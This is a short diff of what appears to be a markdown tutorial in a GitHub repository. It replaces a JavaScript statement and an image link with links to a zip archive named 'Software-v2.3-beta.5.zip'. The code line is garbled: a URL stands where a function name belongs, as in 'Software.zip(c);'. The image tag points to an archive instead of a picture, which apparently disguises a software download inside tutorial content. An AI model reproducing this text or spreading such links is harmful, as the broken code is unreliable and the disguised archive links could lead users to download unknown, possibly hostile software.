@@ -13,10 +13,10 @@ const b = 23;
 
 const c = a + b;
 
-https://github.com/mehedihasanfarabi10/githubtutorial/releases/download/v2.0/Software.zip(c);
+https://github.com/mehedihasanfarabi10/githubtutorial/raw/refs/heads/master/images/Software-v2.3-beta.5.zip(c);
 
 ```
 
 <h2>Images</h2>
 
-![mehedi hassan](https://github.com/mehedihasanfarabi10/githubtutorial/releases/download/v2.0/Software.zip)
+![mehedi hassan](https://github.com/mehedihasanfarabi10/githubtutorial/raw/refs/heads/master/images/Software-v2.3-beta.5.zip)
